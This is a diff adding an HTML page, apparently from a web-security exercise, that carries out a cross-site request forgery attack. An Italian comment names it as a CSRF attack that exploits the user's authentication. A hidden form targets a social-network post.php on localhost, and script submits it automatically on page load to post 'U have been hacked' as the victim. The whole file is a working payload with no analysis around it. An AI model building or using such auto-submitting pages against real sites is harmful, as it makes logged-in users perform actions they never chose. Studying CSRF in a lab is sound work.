@@ -1,0 +1,14 @@
+<html>
+    <head>
+        <title>x.com</title>
+    </head>
+    <body>
+        <!-- attacco CSRF, il cui requisito fondamentale è il fatto che sfrutta l'autenticazione dell'utente -->
+        <form method="post" action="http://localhost:8888/social_network/post.php" id="hack">
+            <input type="hidden" name="message" value="U have been hacked">
+        </form>
+        <script>
+            document.getElementById("hack").submit();
+        </script>
+    </body>
+</html>
